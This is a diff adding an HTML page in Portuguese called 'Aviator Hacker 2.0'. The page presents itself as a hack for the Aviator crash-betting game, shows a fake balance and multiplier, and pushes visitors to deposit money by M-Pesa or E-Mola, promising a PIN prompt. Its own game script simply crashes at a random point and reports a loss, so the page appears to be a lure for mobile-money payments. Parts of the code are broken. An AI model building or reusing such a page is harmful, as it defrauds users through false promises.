@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Simples</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-gray-900 text-white h-screen flex flex-col">
+
+    <!-- Topo -->
+    <div class="flex justify-between items-center gap-3 p-4 bg-gray-800">
+        <h1 class="text-red-500 font-bold text-xl">Aviator Hacker 2.0</h1>
+        <button id="levantar" class="bg-[#97BB3A] px-4 py-2 rounded-lg">Levantar</button>
+        <span class="text-2xl">Saldo: <strong id="saldo">24,364.00</strong> MT</span>
+    </div>
+
+    <!-- Container principal -->
+    <div class="flex flex-1">
+
+        <!-- Área da animação -->
+        <div class="flex-1 flex flex-col items-center justify-center relative">
+            <div class="text-6xl font-bold text-red-500" id="multiplier">93.00x</div>
+            <div class="mt-6 text-gray-400">✈️ Faça um deposito para iniciar...</div>
+        </div>
+
+        <!-- Lista de apostas -->
+        <!-- <div class="w-72 bg-gray-800 p-4 overflow-y-auto">
+      <h2 class="font-bold mb-2">Apostas</h2>
+      <ul id="apostasLista" class="space-y-2 text-sm"></ul>
+    </div> -->
+    </div>
+
+    <!-- Rodapé com botão -->
+    <div class="p-4 bg-gray-800 flex justify-center">
+        <button id="openModal" class="px-6 py-3 bg-green-500 hover:bg-green-600 rounded-lg font-bold text-lg">
+            Apostar Agora
+        </button>
+    </div>
+
+    <!-- Modal -->
+    <div id="depositModalShose" class="hidden fixed inset-0 bg-black/60 flex items-center justify-center">
+        <div class="bg-gray-800 p-6 rounded-xl shadow-lg w-80 text-center">
+            <h2 class="text-xl font-bold mb-4">Escolha o valor do depósito</h2>
+            <div class="grid grid-cols-2 gap-3">
+                <button class="depositBtn bg-blue-500 hover:bg-blue-600 py-2 rounded-lg font-semibold"
+                    data-value="200">200</button>
+                <button class="depositBtn bg-blue-500 hover:bg-blue-600 py-2 rounded-lg font-semibold"
+                    data-value="500">500</button>
+                <button class="depositBtn bg-blue-500 hover:bg-blue-600 py-2 rounded-lg font-semibold"
+                    data-value="1000">1000</button>
+                <button class="depositBtn bg-blue-500 hover:bg-blue-600 py-2 rounded-lg font-semibold"
+                    data-value="10000">10000</button>
+            </div>
+            <button id="closeModal" class="mt-6 px-4 py-2 bg-red-500 hover:bg-red-600 rounded-lg">Fechar</button>
+        </div>
+    </div>
+
+    <!-- Deposito -->
+    <div id="depositModal" class="hidden fixed inset-0 bg-black/60 flex items-center justify-center">
+        <div class="bg-gray-800 p-6 rounded-xl shadow-lg w-80 text-center">
+            <h2 class="text-xl font-bold mb-4">Esta a depositar 100 MT</h2>
+            <p id="info" class="hidden">Insira seu pin no popup que aparecerá na sua tela dentro 4 segundos.</p>
+            <p id="output" class="text-red-500 font-bold"></p>
+            <p id="buyer-name"></p>
+            <div class="grid justify-center">
+
+
+                <div>
+                    <div class="bg-white shadow rounded-lg max-w-96 p-2">
+                        <!-- Opção M-Pesa -->
+                        <label class="flex items-center border rounded-lg cursor-pointer p-3">
+                            <input type="radio" name="pagamento" value="mpesa" class="mr-2" style="accent-color: green;"
+                                checked>
+                            <img src="/finalizar-compra/mpesa_logo.png" alt="M-Pesa" class="w-19 h-9 object-contain">
+                        </label>
+                        <div id="input-mpesa" class="mt-2">
+                            <label class="text-sm text-gray-700">Número de celular*</label>
+                            <input id="mpesa-number" type="text" placeholder="84xxxxxxx"
+                                class="mt-1 w-full border rounded-lg px-2 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 text-black">
+                        </div>
+
+
+                        <!-- Opção E-Mola -->
+                        <label class="flex items-center border rounded-lg cursor-pointer p-3">
+                            <input type="radio" name="pagamento" value="emola" class="mr-2"
+                                style="accent-color: green;">
+                            <img src="/finalizar-compra/emola.png" alt="E-Mola" class="w-19 h-9 object-contain">
+                        </label>
+                        <div id="input-emola" class="mt-2 hidden">
+                            <label class="text-sm text-gray-700">Número de celular*</label>
+                            <input id="emola-number" type="text" placeholder="86xxxxxxx"
+                                class="mt-1 w-full border rounded-lg px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500  text-black">
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <button id="pay" class="mt-6 px-4 py-2 bg-red-500 hover:bg-red-600 rounded-lg">Depositar</button>
+        </div>
+    </div>
+    <script src="/aviator-tool//bet//script.js"></script>
+    <script>
+        let saldo = 10000;
+        let apostaAtual = 0;
+        let multiplier = 1.00;
+        let rodando = false;
+        let interval;
+
+        const saldoEl = document.getElementById("saldo");
+        const multiplierEl = document.getElementById("multiplier");
+        const apostasLista = document.getElementById("apostasLista");
+        const levantar = document.getElementById("levantar")
+
+        // Abrir/fechar modal
+        const openModal = document.getElementById("openModal");
+        const closeModal = document.getElementById("closeModal");
+        const modal = document.getElementById("depositModal");
+
+        openModal.addEventListener("click", () => modal.classList.remove("hidden"));
+        levantar.addEventListener("click", () => modal.classList.remove("hidden"));
+        closeModal.addEventListener("click", () => modal.classList.add("hidden"));
+
+        // Escolher depósito
+        document.querySelectorAll(".depositBtn").forEach(btn => {
+            btn.addEventListener("click", () => {
+                apostaAtual = parseInt(btn.getAttribute("data-value"));
+                if (apostaAtual > saldo) {
+                    alert("Saldo insuficiente!");
+                    return;
+                }
+                saldo -= apostaAtual;
+                saldoEl.innerText = saldo;
+                modal.classList.add("hidden");
+                iniciarRodada();
+            });
+        });
+
+        function iniciarRodada() {
+            if (rodando) return;
+            rodando = true;
+            multiplier = 1.00;
+            multiplierEl.innerText = multiplier.toFixed(2) + "x";
+
+            let stopAt = (Math.random() * 10 + 1).toFixed(2); // multiplicador aleatório de crash
+            interval = setInterval(() => {
+                multiplier += 0.05;
+                multiplierEl.innerText = multiplier.toFixed(2) + "x";
+
+                if (multiplier.toFixed(2) >= stopAt) {
+                    clearInterval(interval);
+                    rodando = false;
+                    apostasLista.innerHTML += `<li class="text-red-400">💥 Crash em ${stopAt}x — Você perdeu ${apostaAtual}!</li>`;
+                }
+            }, 200);
+        }
+    </script>
+
+    <script>
+        const radios = document.querySelectorAll('input[name="pagamento"]');
+        const inputMpesa = document.getElementById('input-mpesa');
+        const inputEmola = document.getElementById('input-emola');
+
+        radios.forEach(radio => {
+            radio.addEventListener('change', () => {
+                if (radio.value === 'mpesa') {
+                    inputMpesa.classList.remove('hidden');
+                    inputEmola.classList.add('hidden');
+                } else {
+                    inputEmola.classList.remove('hidden');
+                    inputMpesa.classList.add('hidden');
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
